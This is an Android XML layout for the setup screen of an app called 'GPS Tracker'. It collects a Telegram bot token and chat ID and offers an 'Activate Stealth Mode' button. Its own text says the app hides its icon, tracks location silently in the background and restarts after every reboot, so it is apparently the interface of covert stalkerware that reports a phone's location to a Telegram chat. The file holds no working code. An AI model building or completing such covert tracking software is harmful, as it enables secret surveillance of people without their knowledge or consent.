<?xml version="1.0" encoding="utf-8"?>
<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:fillViewport="true"
    android:background="#0D0D0D">

    <androidx.constraintlayout.widget.ConstraintLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:padding="24dp">

        <!-- Header -->
        <TextView
            android:id="@+id/tvTitle"
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:text="GPS Tracker"
            android:textSize="26sp"
            android:textStyle="bold"
            android:textColor="#FFFFFF"
            android:gravity="center"
            android:layout_marginTop="20dp"
            app:layout_constraintTop_toTopOf="parent"
            app:layout_constraintStart_toStartOf="parent"
            app:layout_constraintEnd_toEndOf="parent" />

        <TextView
            android:id="@+id/tvSubtitle"
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:text="One-time setup"
            android:textSize="12sp"
            android:textColor="#888888"
            android:gravity="center"
            android:letterSpacing="0.15"
            android:layout_marginTop="4dp"
            app:layout_constraintTop_toBottomOf="@id/tvTitle"
            app:layout_constraintStart_toStartOf="parent"
            app:layout_constraintEnd_toEndOf="parent" />

        <!-- Stealth active card (shown after activation) -->
        <androidx.cardview.widget.CardView
            android:id="@+id/cardActive"
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:layout_marginTop="24dp"
            android:visibility="gone"
            app:cardBackgroundColor="#0A2A0A"
            app:cardCornerRadius="14dp"
            app:cardElevation="0dp"
            app:layout_constraintTop_toBottomOf="@id/tvSubtitle"
            app:layout_constraintStart_toStartOf="parent"
            app:layout_constraintEnd_toEndOf="parent">

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="vertical"
                android:padding="20dp"
                android:gravity="center">

                <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="🔒"
                    android:textSize="32sp" />

                <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="Stealth Mode Active"
                    android:textColor="#4CAF50"
                    android:textSize="17sp"
                    android:textStyle="bold"
                    android:layout_marginTop="8dp" />

                <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="This app will now disappear from your home screen and app drawer. Tracking runs silently in the background and restarts automatically after every reboot."
                    android:textColor="#AAAAAA"
                    android:textSize="13sp"
                    android:gravity="center"
                    android:layout_marginTop="8dp" />

            </LinearLayout>
        </androidx.cardview.widget.CardView>

        <!-- Setup form (hidden after activation) -->
        <LinearLayout
            android:id="@+id/layoutSetup"
            android:layout_width="0dp"
            android:layout_height="wrap_content"
            android:orientation="vertical"
            android:layout_marginTop="24dp"
            app:layout_constraintTop_toBottomOf="@id/tvSubtitle"
            app:layout_constraintStart_toStartOf="parent"
            app:layout_constraintEnd_toEndOf="parent">

            <!-- Bot Token -->
            <TextView
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="TELEGRAM BOT TOKEN"
                android:textSize="11sp"
                android:textColor="#888888"
                android:letterSpacing="0.12" />

            <com.google.android.material.textfield.TextInputLayout
                android:id="@+id/tilBotToken"
                style="@style/Widget.MaterialComponents.TextInputLayout.OutlinedBox"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_marginTop="6dp"
                app:boxStrokeColor="#444444"
                app:boxStrokeColorStateList="@null">

                <com.google.android.material.textfield.TextInputEditText
                    android:id="@+id/etBotToken"
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:hint="123456:ABC-DEF..."
                    android:textColor="#FFFFFF"
                    android:textColorHint="#555555"
                    android:inputType="textVisiblePassword"
                    android:imeOptions="actionNext"
                    android:fontFamily="monospace"
                    android:textSize="13sp" />
            </com.google.android.material.textfield.TextInputLayout>

            <!-- Chat ID -->
            <TextView
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="TELEGRAM CHAT ID"
                android:textSize="11sp"
                android:textColor="#888888"
                android:letterSpacing="0.12"
                android:layout_marginTop="16dp" />

            <com.google.android.material.textfield.TextInputLayout
                android:id="@+id/tilChatId"
                style="@style/Widget.MaterialComponents.TextInputLayout.OutlinedBox"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_marginTop="6dp"
                app:boxStrokeColor="#444444"
                app:boxStrokeColorStateList="@null">

                <com.google.android.material.textfield.TextInputEditText
                    android:id="@+id/etChatId"
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:hint="-100123456789"
                    android:textColor="#FFFFFF"
                    android:textColorHint="#555555"
                    android:inputType="numberSigned"
                    android:imeOptions="actionDone"
                    android:fontFamily="monospace"
                    android:textSize="13sp" />
            </com.google.android.material.textfield.TextInputLayout>

            <TextView
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:text="Get Chat ID: message @userinfobot on Telegram"
                android:textSize="11sp"
                android:textColor="#555555"
                android:layout_marginTop="6dp" />

            <!-- Test button -->
            <com.google.android.material.button.MaterialButton
                android:id="@+id/btnTest"
                style="@style/Widget.MaterialComponents.Button.OutlinedButton"
                android:layout_width="match_parent"
                android:layout_height="48dp"
                android:layout_marginTop="20dp"
                android:text="Send Test Message"
                android:textSize="14sp"
                app:cornerRadius="10dp"
                app:strokeColor="#444444" />

            <!-- Activate stealth -->
            <com.google.android.material.button.MaterialButton
                android:id="@+id/btnActivate"
                android:layout_width="match_parent"
                android:layout_height="56dp"
                android:layout_marginTop="12dp"
                android:text="Activate Stealth Mode"
                android:textSize="15sp"
                android:textStyle="bold"
                app:backgroundTint="#4CAF50"
                app:cornerRadius="10dp" />

            <TextView
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:text="⚠ Once activated, the app icon will vanish. To access settings again: Settings → Apps → GPS Tracker → Open."
                android:textSize="11sp"
                android:textColor="#666666"
                android:layout_marginTop="10dp"
                android:layout_marginBottom="8dp" />

        </LinearLayout>

    </androidx.constraintlayout.widget.ConstraintLayout>
</ScrollView>
